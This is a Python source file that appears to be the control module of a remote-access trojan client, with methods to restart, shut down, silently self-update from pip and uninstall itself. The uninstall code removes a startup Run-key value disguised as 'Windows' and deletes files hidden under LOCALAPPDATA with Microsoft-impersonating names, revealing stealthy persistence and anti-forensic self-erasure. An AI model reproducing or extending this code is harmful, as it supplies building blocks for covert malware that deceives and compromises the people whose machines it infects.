import os
import sys
import shutil
import winreg as reg
import subprocess
from packaging import version
import importlib

class ClientControl:
    @staticmethod
    def restart_self():
        os.execl(sys.executable, sys.executable, *sys.argv)

    @staticmethod
    def shutdown_self():
        sys.exit()
    
    @staticmethod
    def update_self():
        try:
            package_name = "thispackagedoesnotexist"
            installed_version = subprocess.run(
                [sys.executable, "-m", "pip", "show", package_name],
                capture_output=True, text=True
            ).stdout.split("Version: ")[1].splitlines()[0]

            installed_version = installed_version.strip("()")

            result = subprocess.run(
                [sys.executable, "-m", "pip", "index", "versions", package_name],
                capture_output=True, text=True
            )
            latest_version = result.stdout.split('\\n')[0].split(' ')[-1]

            latest_version = latest_version.strip("()")

            if version.parse(installed_version) < version.parse(latest_version):
                subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", package_name, "--no-cache-dir"])
                importlib.import_module(package_name)
                importlib.reload(sys.modules[package_name])
        except subprocess.CalledProcessError as e:
            return False
        except IndexError:
            return False
        except Exception:
            return False


    @staticmethod
    def uninstall_self():
        def remove_from_startup_registry():
            key = reg.HKEY_CURRENT_USER
            sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            value_name = "Windows"
            try:
                with reg.OpenKey(key, sub_key, 0, reg.KEY_WRITE) as registry_key:
                    reg.DeleteValue(registry_key, value_name)
            except FileNotFoundError:
                pass
            except Exception:
                pass

        def remove_files_and_folders(python_library_path, installation_file, bat_file):
            try:
                if os.path.exists(python_library_path):
                    shutil.rmtree(python_library_path)

                if os.path.exists(installation_file):
                    os.remove(installation_file)

                if os.path.exists(bat_file):
                    os.remove(bat_file)

            except Exception:
                pass

        python_library_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Python')
        installation_file = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Microsoft.pyw')
        bat_file = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Microsoft.bat')

        remove_from_startup_registry()
        remove_files_and_folders(python_library_path, installation_file, bat_file)
        ClientControl.shutdown_self()